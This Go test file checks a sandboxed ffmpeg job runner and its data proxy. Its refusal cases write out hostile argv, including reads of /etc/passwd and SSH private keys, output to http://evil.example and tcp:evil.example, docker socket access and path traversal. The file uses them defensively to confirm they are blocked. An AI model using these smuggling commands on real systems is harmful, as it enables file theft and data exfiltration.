package computenode

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"gitea.lan/matthew/fog/internal/compute"
)

func TestPrepareRefusesWhatReachesPastTheRun(t *testing.T) {
	const server, out = "http://fog:8080/compute/v1/data/tok", "/work/r1"
	good := []string{"ffmpeg", "-hide_banner", "-protocol_whitelist", "http,https,tcp,tls", "-i", "{server}/fog/compute/runs/x/source",
		"-vf", "zscale=t=linear:npl=100,format=gbrpf32le,tonemap=tonemap=hable,hwupload,scale_vt=w=-2:h=1080",
		"-filter_complex", "[0:3][picture]scale2ref=w=main_w:h=main_h[sub][base];[base][sub]overlay=eof_action=pass",
		"-hls_fmp4_init_filename", "init.mp4", "-hls_segment_filename", "{out}/gop-%d.m4s", "-progress", "{out}/progress", "{out}/index.m3u8"}
	// Once's date stamp draws with a system font.
	if _, err := Prepare([]string{"ffmpeg", "-i", "{server}/fog/compute/a", "-filter_complex", "[0:v]scale=960:540,drawtext=font=Sans:text='2 Mar 2026':x=10:y=h-th-10[v]", "{out}/s.mp4"}, "ffmpeg", server, out); err != nil {
		t.Fatalf("a date stamp refused: %v", err)
	}
	cmd, err := Prepare(good, "/opt/homebrew/bin/ffmpeg", server, out)
	if err != nil {
		t.Fatalf("a Stream session refused: %v", err)
	}
	if cmd[0] != "/opt/homebrew/bin/ffmpeg" || !slices.Contains(cmd, server+"/fog/compute/runs/x/source") || cmd[len(cmd)-1] != "/work/r1/index.m3u8" {
		t.Fatalf("prepared: %q", cmd)
	}

	bad := map[string][]string{
		"not ffmpeg":       {"sh", "-c", "id"},
		"another URL":      {"ffmpeg", "-i", "http://evil.example/x"},
		"a local file":     {"ffmpeg", "-i", "/Users/me/secret.mov"},
		"file: scheme":     {"ffmpeg", "-i", "file:/etc/passwd"},
		"climbing out":     {"ffmpeg", "-i", "{out}/../../etc/passwd"},
		"movie filter":     {"ffmpeg", "-i", "{server}/fog/compute/a", "-vf", "movie=/etc/passwd[m];[0][m]overlay"},
		"subtitles file":   {"ffmpeg", "-i", "{server}/fog/compute/a", "-vf", "subtitles=/Users/me/x.srt"},
		"drawtext file":    {"ffmpeg", "-i", "{server}/fog/compute/a", "-vf", "drawtext=textfile=/etc/hosts"},
		"drawtext font":    {"ffmpeg", "-i", "{server}/fog/compute/a", "-vf", "drawtext=fontfile=/Users/me/x:text=a"},
		"filter script":    {"ffmpeg", "-filter_script", "/tmp/x"},
		"lavfi input":      {"ffmpeg", "-f", "lavfi", "-i", "movie=/etc/passwd"},
		"write outside":    {"ffmpeg", "-i", "{server}/fog/compute/a", "/tmp/out.mp4"},
		"protocol":         {"ffmpeg", "-protocol_whitelist", "http,rtmp", "-i", "{server}/fog/compute/a"},
		"server traversal": {"ffmpeg", "-i", "{server}/fog/compute/../../api/v1/settings"},
	}
	for name, argv := range bad {
		if _, err := Prepare(argv, "ffmpeg", server, out); err == nil {
			t.Errorf("%s: allowed %q", name, argv)
		}
	}
}

func (a *appStub) hits() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	return a.reads
}

// appStub is the app end of a run: it serves the source and keeps what's
// uploaded, in order.
type appStub struct {
	mu       sync.Mutex
	reads    int
	source   string
	uploaded []string
	bodies   map[string]int
}

func (a *appStub) server(t *testing.T) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/source"):
			a.mu.Lock()
			src := a.source
			a.reads++
			a.mu.Unlock()
			http.ServeFile(w, r, src)
		case r.Method == "PUT":
			n, _ := io.Copy(io.Discard, r.Body)
			a.mu.Lock()
			name := filepath.Base(r.URL.Path)
			a.uploaded = append(a.uploaded, name)
			if a.bodies == nil {
				a.bodies = map[string]int{}
			}
			a.bodies[name] = int(n)
			a.mu.Unlock()
			w.WriteHeader(http.StatusNoContent)
		default:
			http.NotFound(w, r)
		}
	}))
}

// testServer is a run's data route as fog names it.
const testServer = compute.DataPath + "tok-0123456789abcdef"

func needFFmpeg(t *testing.T) string {
	t.Helper()
	ff := FindFFmpeg("")
	if ff == "" {
		t.Skip("no ffmpeg on this machine")
	}
	// One that cannot start (a Homebrew upgrade left it linked to a
	// library that is gone) is as good as none.
	if err := exec.Command(ff, "-version").Run(); err != nil {
		t.Skipf("ffmpeg at %s does not run: %v", ff, err)
	}
	return ff
}

func waitExit(t *testing.T, r *Runner, id string) compute.Exited {
	t.Helper()
	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		_, exited, _ := r.Report()
		for _, e := range exited {
			if e.ID == id {
				return e
			}
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("run %s never ended", id)
	return compute.Exited{}
}

func TestRunnerStreamsFragmentsAfterTheirInit(t *testing.T) {
	ff := needFFmpeg(t)
	src := filepath.Join(t.TempDir(), "src.mp4")
	if out, err := exec.Command(ff, "-v", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:rate=25:duration=6", "-c:v", "libx264",
		"-g", "25", src).CombinedOutput(); err != nil {
		t.Skipf("can't make a source: %v %s", err, out)
	}
	app := &appStub{source: src}
	srv := app.server(t)
	defer srv.Close()

	r := &Runner{Fog: srv.URL, FFmpeg: ff, Work: workDir(t), Log: quiet()}
	r.Unconfined = !confinesHere(t, r)
	r.Start(compute.NodeRun{
		ID: "r1", Class: compute.ClassInteractive, Server: testServer,
		Argv: []string{"ffmpeg", "-hide_banner", "-v", "error", "-protocol_whitelist", "http,https,tcp,tls", "-i", "{server}/fog/compute/runs/x/source",
			"-c:v", "libx264", "-force_key_frames", "expr:gte(t,n_forced*1)", "-f", "hls", "-hls_time", "0.001", "-hls_segment_type", "fmp4",
			"-hls_fmp4_init_filename", "init.mp4", "-hls_flags", "temp_file", "-hls_segment_filename", "{out}/gop-%d.m4s", "{out}/index.m3u8"},
		Outputs: compute.Outputs{Init: []string{"init.mp4"}, Stream: "gop-*.m4s"},
		Upload:  "{server}/fog/compute/runs/x/files/{name}",
	})
	running, _, _ := r.Report()
	if !slices.Contains(running, "r1") {
		t.Fatalf("not running: %v", running)
	}
	e := waitExit(t, r, "r1")
	if e.Status == nil || *e.Status != 0 {
		t.Fatalf("exit: %+v", e)
	}
	app.mu.Lock()
	defer app.mu.Unlock()
	if len(app.uploaded) < 6 || app.uploaded[0] != "init.mp4" || slices.Contains(app.uploaded[1:], "init.mp4") {
		t.Fatalf("uploads: %v", app.uploaded)
	}
	for _, name := range app.uploaded {
		if app.bodies[name] == 0 {
			t.Fatalf("%s uploaded empty", name)
		}
	}
	if entries, _ := os.ReadDir(r.Work); len(entries) != 0 {
		t.Fatal("the run's directory was left behind")
	}
}

func TestRunnerFinalOutputsAndStops(t *testing.T) {
	ff := needFFmpeg(t)
	app := &appStub{}
	srv := app.server(t)
	defer srv.Close()
	r := &Runner{Fog: srv.URL, FFmpeg: ff, Work: workDir(t), Log: quiet()}
	r.Unconfined = !confinesHere(t, r)

	// lavfi isn't allowed as an input: a run that tries is refused, and
	// reported at once.
	r.Start(compute.NodeRun{ID: "bad", Server: testServer, Argv: []string{"ffmpeg", "-f", "lavfi", "-i", "testsrc2"}, Upload: "{server}/fog/compute/x/{name}"})
	if e := waitExit(t, r, "bad"); e.Status != nil || !strings.Contains(e.Log, "not allowed") {
		t.Fatalf("refusal: %+v", e)
	}

	// A run whose output is final uploads it after a clean exit.
	src := filepath.Join(t.TempDir(), "src.mp4")
	exec.Command(ff, "-v", "error", "-f", "lavfi", "-i", "testsrc2=size=320x240:duration=1", src).Run()
	app.mu.Lock()
	app.source = src
	app.mu.Unlock()
	r.Start(compute.NodeRun{ID: "o1", Class: compute.ClassBatch, Server: testServer,
		Argv:    []string{"ffmpeg", "-v", "error", "-protocol_whitelist", "http,tcp", "-i", "{server}/fog/compute/s/source", "-progress", "{out}/progress", "{out}/output.mp4"},
		Outputs: compute.Outputs{Final: []string{"output.mp4"}}, Upload: "{server}/fog/compute/files/{name}"})
	if e := waitExit(t, r, "o1"); e.Status == nil || *e.Status != 0 {
		t.Fatalf("o1: %+v", e)
	}
	app.mu.Lock()
	got := slices.Clone(app.uploaded)
	app.mu.Unlock()
	if !slices.Equal(got, []string{"output.mp4"}) {
		t.Fatalf("uploads: %v", got)
	}

	// A stopped run ends at once, reported with no status.
	r.Start(compute.NodeRun{ID: "long", Server: testServer,
		Argv:    []string{"ffmpeg", "-v", "error", "-re", "-protocol_whitelist", "http,tcp", "-stream_loop", "-1", "-i", "{server}/fog/compute/s/source", "-f", "null", "{out}/null"},
		Outputs: compute.Outputs{Final: []string{"x"}}, Upload: "{server}/fog/compute/files/{name}"})
	time.Sleep(300 * time.Millisecond)
	r.Stop("long")
	if e := waitExit(t, r, "long"); e.Status != nil {
		t.Fatalf("stopped run: %+v", e)
	}
}

// Ways to smuggle a file, a socket or a host past the checks, through
// ffmpeg's protocols, its options and its filters.
func TestPrepareRefusesSmuggling(t *testing.T) {
	const server, out = "http://127.0.0.1:7719/compute/v1/data/tok", "/work/r1"
	src := "{server}/fog/compute/a"
	bad := map[string][]string{
		"concat protocol":         {"ffmpeg", "-i", "concat:{out}/a.ts|/etc/passwd"},
		"concat of the run's own": {"ffmpeg", "-i", "concat:{server}/fog/compute/a|{server}/fog/compute/b"},
		"subfile":                 {"ffmpeg", "-i", "subfile:,,start,0,end,0,,:/Users/me/.ssh/id_ed25519"},
		"file: outside":           {"ffmpeg", "-i", src, "file:/Users/me/out.mp4"},
		"http elsewhere":          {"ffmpeg", "-i", src, "-f", "mpegts", "http://evil.example/up"},
		"unix socket output":      {"ffmpeg", "-i", src, "-f", "data", "unix:/var/run/docker.sock"},
		"tcp output":              {"ffmpeg", "-i", src, "-f", "mpegts", "tcp:evil.example:9"},
		"udp output":              {"ffmpeg", "-i", src, "-f", "mpegts", "udp:224.0.0.1:1234"},
		"md5 to a path":           {"ffmpeg", "-i", src, "-f", "md5", "md5:/tmp/x"},
		"tee format":              {"ffmpeg", "-i", src, "-f", "tee", "[f=mp4]{out}/a.mp4|[f=mp4]/tmp/b.mp4"},
		"tee protocol":            {"ffmpeg", "-i", src, "tee:{out}/a.mp4|/tmp/b.mp4"},
		"attach":                  {"ffmpeg", "-i", src, "-attach", "{out}/x", "{out}/o.mkv"},
		"dump_attachment":         {"ffmpeg", "-dump_attachment:t", "", "-i", src},
		"dump_attachment:t:0":     {"ffmpeg", "-dump_attachment:t:0", "{out}/x", "-i", src},
		"filter_script:v":         {"ffmpeg", "-filter_script:v", "{out}/s", "-i", src},
		"option from a file":      {"ffmpeg", "-i", src, "-/filter_complex", "{out}/graph", "{out}/o.mp4"},
		"movie":                   {"ffmpeg", "-i", src, "-filter_complex", "movie={out}/x[m];[0][m]overlay", "{out}/o.mp4"},
		"amovie":                  {"ffmpeg", "-i", src, "-af", "amovie=/etc/passwd", "{out}/o.mp4"},
		"filter:v movie":          {"ffmpeg", "-i", src, "-filter:v", "movie=x", "{out}/o.mp4"},
		"a plugin":                {"ffmpeg", "-i", src, "-vf", "frei0r=filter_name=distort0r", "{out}/o.mp4"},
		"a model file":            {"ffmpeg", "-i", src, "-af", "arnndn=m=/usr/share/x.rnnn", "{out}/o.mp4"},
		"stats to a file":         {"ffmpeg", "-i", src, "-lavfi", "[0:v][0:v]psnr=stats_file=/tmp/p", "-f", "null", "-"},
		"concat with an unsafe":   {"ffmpeg", "-f", "concat", "-safe", "0", "-i", "{out}/list.txt"},
		"a device":                {"ffmpeg", "-f", "avfoundation", "-i", "0"},
		"a device on linux":       {"ffmpeg", "-f", "v4l2", "-i", "{out}/x"},
		"a preset file":           {"ffmpeg", "-i", src, "-fpre", "{out}/x.ffpreset", "{out}/o.mp4"},
		"a listener":              {"ffmpeg", "-listen", "1", "-i", src},
		"progress to a socket":    {"ffmpeg", "-i", src, "-progress", "unix:/tmp/s", "{out}/o.mp4"},
		"hw device in the home":   {"ffmpeg", "-init_hw_device", "vaapi=va:/home/me/.ssh/id_rsa", "-i", src},
		"climbing, relative":      {"ffmpeg", "-i", src, "../../../../tmp/x.mp4"},
		"climbing in a URL":       {"ffmpeg", "-i", "{server}/fog/compute/a/../../../api/v1/apps"},
		"climbing in a value":     {"ffmpeg", "-i", src, "-hls_segment_filename", "{out}/../x%d.ts", "{out}/i.m3u8"},
		"another fog path":        {"ffmpeg", "-i", "http://127.0.0.1:7719/api/v1/settings"},
		"the data route, other":   {"ffmpeg", "-i", "http://127.0.0.1:7719/compute/v1/data/other/fog/compute/a"},
		"a path after a pipe":     {"ffmpeg", "-i", "{server}/fog/compute/x|/etc/passwd"},
		"data URL":                {"ffmpeg", "-i", "data:text/plain;base64,aGk="},
		"crypto":                  {"ffmpeg", "-i", "crypto:/Users/me/x"},
		"fd":                      {"ffmpeg", "-i", src, "fd:3"},
	}
	for name, argv := range bad {
		if _, err := Prepare(argv, "ffmpeg", server, out); err == nil {
			t.Errorf("%s: allowed %q", name, argv)
		}
	}
	good := map[string][]string{
		"vaapi":             {"ffmpeg", "-init_hw_device", "vaapi=va:/dev/dri/renderD128", "-filter_hw_device", "va", "-hwaccel", "vaapi", "-hwaccel_device", "/dev/dri/renderD128", "-i", src, "-vf", "format=nv12,hwupload,scale_vaapi=w=1280:h=-2", "-c:v", "h264_vaapi", "{out}/o.mp4"},
		"stream specifiers": {"ffmpeg", "-i", src, "-map", "0:v:0", "-map", "0:a:1?", "-c:v", "h264_videotoolbox", "-b:v", "4M", "-metadata:s:a:0", "language=eng", "-map_metadata", "-1", "{out}/o.mp4"},
		"to stdout":         {"ffmpeg", "-i", src, "-f", "null", "-", "-f", "mpegts", "pipe:1"},
		"frame rates":       {"ffmpeg", "-i", src, "-r", "30000/1001", "-vf", "scale=iw/2:ih/2,fps=24000/1001", "{out}/o.mp4"},
		"a concat list":     {"ffmpeg", "-f", "concat", "-i", "{server}/fog/compute/list.txt", "-c", "copy", "{out}/o.mp4"},
		"file: inside":      {"ffmpeg", "-i", src, "file:{out}/o.mp4"},
		"seek":              {"ffmpeg", "-ss", "00:01:02.5", "-i", src, "-t", "10", "{out}/o.mp4"},
	}
	for name, argv := range good {
		if _, err := Prepare(argv, "ffmpeg", server, out); err != nil {
			t.Errorf("%s: refused: %v", name, err)
		}
	}
}

// What fog sends is checked before anything is made for it: an id that
// would name a directory outside the work directory, a data route that
// isn't fog's, uploads elsewhere, outputs outside the run.
func TestRunnerRefusesWhatFogShouldntSend(t *testing.T) {
	ff := needFFmpeg(t)
	parent := t.TempDir()
	victim := filepath.Join(parent, "victim")
	os.Mkdir(victim, 0o700)
	os.WriteFile(filepath.Join(victim, "keep"), []byte("x"), 0o600)
	r := &Runner{Fog: "http://127.0.0.1:1", FFmpeg: ff, Work: filepath.Join(parent, "node", "work"), Log: quiet(), Unconfined: true}
	ok := compute.NodeRun{Server: testServer, Argv: []string{"ffmpeg", "-version"}, Upload: "{server}/fog/compute/x/{name}"}

	for _, id := range []string{"../../victim", "..", "a/b", "", strings.Repeat("x", 65)} {
		bad := ok
		bad.ID = id
		r.Start(bad)
	}
	if _, err := os.Stat(filepath.Join(victim, "keep")); err != nil {
		t.Fatal("a run id reached outside the work directory")
	}
	if running, exited, _ := r.Report(); len(running) != 0 || len(exited) != 0 {
		t.Fatalf("bad ids ran: %v %v", running, exited)
	}

	cases := map[string]func(*compute.NodeRun){
		"server":       func(n *compute.NodeRun) { n.Server = "/api/v1" },
		"server climb": func(n *compute.NodeRun) { n.Server = compute.DataPath + "tok-0123456789abcdef/../../api" },
		"upload host":  func(n *compute.NodeRun) { n.Upload = "http://evil.example/{name}" },
		"upload path":  func(n *compute.NodeRun) { n.Upload = "{server}/api/v1/{name}" },
		"upload climb": func(n *compute.NodeRun) { n.Upload = "{server}/fog/compute/../../x/{name}" },
		"init":         func(n *compute.NodeRun) { n.Outputs.Init = []string{"../../.ssh/id_ed25519"} },
		"final":        func(n *compute.NodeRun) { n.Outputs.Final = []string{"/etc/passwd"} },
		"stream":       func(n *compute.NodeRun) { n.Outputs.Stream = "../*" },
		"limits":       func(n *compute.NodeRun) { n.Limits = &compute.RunLimits{Seconds: -1} },
	}
	for name, spoil := range cases {
		bad := ok
		bad.ID = "r-" + strings.ReplaceAll(name, " ", "-")
		spoil(&bad)
		r.Start(bad)
		if e := waitExit(t, r, bad.ID); e.Status != nil || !strings.HasPrefix(e.Log, "fog-node: ") {
			t.Errorf("%s: %+v", name, e)
		}
	}
}

// The data proxy forwards a run's reads of the app's /fog/compute/ to the
// run's data route on fog, MACed as this machine, and nothing else.
// ffmpeg names no token: the proxy adds it.
func TestDataProxyForwardsOnlyTheRunsReads(t *testing.T) {
	var got []string
	fog := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ok := r.Header.Get(compute.HeaderNodeID) == "n1" && compute.MACEqual(r.Header.Get(compute.HeaderNodeAuth),
			compute.DataMAC(compute.TokenDigest("fognode_x"), "n1", r.Header.Get(compute.HeaderNodeNonce), r.Header.Get(compute.HeaderNodeTime), r.Method, r.URL.RequestURI(), ""))
		got = append(got, fmt.Sprintf("%s %s mac=%v auth=%s", r.Method, r.URL.RequestURI(), ok, r.Header.Get("Authorization")))
	}))
	defer fog.Close()
	h := (&Runner{Fog: fog.URL, Auth: func() (string, string) { return "n1", compute.TokenDigest("fognode_x") }}).dataProxy(testServer, "s3cret")
	run := func(method, path, auth string) int {
		req := httptest.NewRequest(method, "/", nil)
		req.URL.Path = path
		req.Header.Set("Authorization", "Bearer smuggled")
		if auth != "" {
			req.SetBasicAuth("fog", auth)
			req.Header.Set("Proxy-Authorization", req.Header.Get("Authorization"))
			req.Header.Set("Authorization", "Bearer smuggled")
		}
		w := httptest.NewRecorder()
		h.ServeHTTP(w, req)
		return w.Code
	}
	do := func(method, path string) int { return run(method, path, "s3cret") }
	// Without the run's secret, or with another, nothing.
	if c := run("GET", "/fog/compute/a/source", ""); c != http.StatusProxyAuthRequired {
		t.Fatalf("no secret: %d", c)
	}
	if c := run("GET", "/fog/compute/a/source", "guess"); c != http.StatusProxyAuthRequired {
		t.Fatalf("a wrong secret: %d", c)
	}
	if c := do("GET", "/fog/compute/a/source"); c != 200 {
		t.Fatalf("its source: %d", c)
	}
	for _, c := range []struct {
		method, path string
		want         int
	}{
		{"PUT", "/fog/compute/a/files/x", 405},
		{"POST", "/fog/compute/a", 405},
		{"GET", "/compute/v1/poll", 404},
		{"GET", "/api/v1/settings", 404},
		{"GET", testServer + "/fog/compute/a", 404},
		{"GET", "/fog/compute/../../../api", 404},
		{"GET", "/fog/computer", 404},
	} {
		if code := do(c.method, c.path); code != c.want {
			t.Errorf("%s %s: %d", c.method, c.path, code)
		}
	}
	if len(got) != 1 || got[0] != "GET "+testServer+"/fog/compute/a/source mac=true auth=" {
		t.Fatalf("fog saw %q", got)
	}
}

// The run's token is in no process's arguments: not the helper's, not
// ffmpeg's (which the helper's carry). ffmpeg's URLs name only the proxy.
func TestARunsTokenIsInNoArgv(t *testing.T) {
	ff := needFFmpeg(t)
	src := filepath.Join(t.TempDir(), "src.mp4")
	if out, err := exec.Command(ff, "-v", "error", "-f", "lavfi", "-i", "testsrc2=size=160x120:rate=25:duration=2", "-c:v", "libx264", src).CombinedOutput(); err != nil {
		t.Skipf("can't make a source: %v %s", err, out)
	}
	app := &appStub{source: src}
	srv := app.server(t)
	defer srv.Close()
	r := &Runner{Fog: srv.URL, FFmpeg: ff, Work: workDir(t), Log: quiet()}
	r.Unconfined = !confinesHere(t, r)
	token := strings.TrimPrefix(testServer, compute.DataPath)
	r.Start(compute.NodeRun{ID: "r1", Server: testServer,
		Argv:    []string{"ffmpeg", "-v", "error", "-re", "-stream_loop", "-1", "-i", "{server}/fog/compute/s/source", "-f", "null", "-"},
		Outputs: compute.Outputs{Final: []string{"x"}}, Upload: "{server}/fog/compute/files/{name}"})
	time.Sleep(500 * time.Millisecond)
	r.mu.Lock()
	run := r.runs["r1"]
	r.mu.Unlock()
	if run == nil {
		t.Fatal("not running")
	}
	args := strings.Join(run.cmd.Args, " ")
	if strings.Contains(args, token) || !strings.Contains(args, "/fog/compute/s/source") || strings.Contains(args, "http_proxy") {
		t.Fatalf("argv: %s", args)
	}
	// Another process on this machine, which can read those arguments,
	// gets nothing through the run's proxy: it lacks the secret in
	// ffmpeg's environment (or, confined on Linux, can't even reach the
	// proxy, in the run's own network).
	for _, guess := range []string{"", "fog:guess"} {
		req, _ := http.NewRequest("GET", fmt.Sprintf("http://127.0.0.1:%d/fog/compute/s/source", run.port), nil)
		if guess != "" {
			req.Header.Set("Proxy-Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(guess)))
		}
		before := app.hits()
		resp, err := http.DefaultClient.Do(req)
		if err == nil {
			resp.Body.Close()
			if resp.StatusCode != http.StatusProxyAuthRequired || app.hits() != before {
				t.Fatalf("another process through the proxy (%q): %d", guess, resp.StatusCode)
			}
		}
	}
	if raw, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", run.cmd.Process.Pid)); err == nil && strings.Contains(string(raw), token) {
		t.Fatalf("/proc cmdline carries the token: %q", raw)
	}
	r.Stop("r1")
	waitExit(t, r, "r1")
	app.mu.Lock()
	defer app.mu.Unlock()
}
